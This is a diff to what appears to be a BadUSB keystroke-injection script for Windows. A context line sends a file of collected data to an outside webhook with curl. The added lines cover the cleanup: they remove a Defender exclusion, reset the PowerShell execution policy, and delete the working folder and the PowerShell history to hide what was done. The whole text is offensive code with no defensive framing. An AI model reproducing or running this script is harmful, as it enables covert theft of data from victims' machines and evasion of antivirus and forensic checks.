@@ -58,14 +58,14 @@ ENTER
 STRING curl.exe -F "file1=@temp.html" $webhook
 ENTER
 DELAY 1000
-STRING cd ..
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy restricted
+ENTER
+DELAY 1500
+STRING A
+ENTER
+DELAY 1000
+STRING cd .. ; rm -r temp/; Remove-Item (Get-PSreadlineOption).HistorySavePath
 ENTER
 DELAY 500
-STRING rm -r temp
-ENTER
-DELAY 500
-REM Delete pwsh history
-STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
-ENTER
 STRING exit
 ENTER
